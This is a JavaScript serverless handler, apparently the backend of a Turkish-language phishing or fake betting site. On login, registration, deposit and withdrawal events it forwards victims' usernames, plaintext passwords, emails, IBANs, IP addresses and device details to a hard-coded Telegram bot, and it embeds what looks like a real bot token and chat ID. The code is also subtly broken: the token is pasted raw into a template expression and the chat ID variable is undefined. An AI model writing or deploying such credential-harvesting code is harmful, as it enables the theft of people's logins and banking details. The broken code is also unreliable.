const BOT_TOKEN = '8629686439:AAGeeFkp232JK-8NWW4tVZitDPScGfGMsqE';
const CHAT_ID = '6760722119';

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { event, data } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Bilinmiyor';
  const userAgent = req.headers['user-agent'] || 'Bilinmiyor';
  const tarih = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });

  let message = '';

  if (event === 'login') {
    message = `🔐 *YENİ GİRİŞ*\n\n👤 Kullanıcı: ${data.username || '-'}\n🔑 Şifre: ${data.password || '-'}\n🌐 IP: ${ip}\n📱 Cihaz: ${userAgent}\n📅 Tarih: ${tarih}`;
  } else if (event === 'register') {
    message = `📝 *YENİ KAYIT*\n\n👤 Kullanıcı: ${data.username || '-'}\n📧 E-posta: ${data.email || '-'}\n🔑 Şifre: ${data.password || '-'}\n🎁 Promosyon: ${data.promoCode || 'Yok'}\n🌐 IP: ${ip}\n📱 Cihaz: ${userAgent}\n📅 Tarih: ${tarih}`;
  } else if (event === 'deposit') {
    message = `💰 *PARA YATIRMA*\n\n👤 Kullanıcı: ${data.username || '-'}\n💵 Miktar: ${data.amount || '-'} TL\n💳 Yöntem: ${data.method || '-'}\n🏦 IBAN: ${data.iban || '-'}\n📅 Tarih: ${tarih}`;
  } else if (event === 'withdrawal') {
    message = `💸 *PARA ÇEKME TALEBİ*\n\n👤 Kullanıcı: ${data.username || '-'}\n💵 Miktar: ${data.amount || '-'} TL\n💳 Yöntem: ${data.method || '-'}\n🏦 IBAN: ${data.iban || '-'}\n📅 Tarih: ${tarih}`;
  } else if (event === 'logout') {
    message = `🚪 *ÇIKIŞ YAPILDI*\n\n👤 Kullanıcı: ${data.username || '-'}\n📅 Tarih: ${tarih}`;
  } else {
    message = `📢 *BİLDİRİM: ${event}*\n\n${JSON.stringify(data, null, 2)}\n📅 Tarih: ${tarih}`;
  }

  const telegramUrl = `https://api.telegram.org/bot${8629686439:AAGeeFkp232JK-8NWW4tVZitDPScGfGMsqE}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: v, text: message, parse_mode: 'Markdown' }),
    });
    const result = await response.json();
    if (result.ok) {
      res.status(200).json({ status: 'success' });
    } else {
      res.status(500).json({ status: 'error', details: result });
    }
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
};
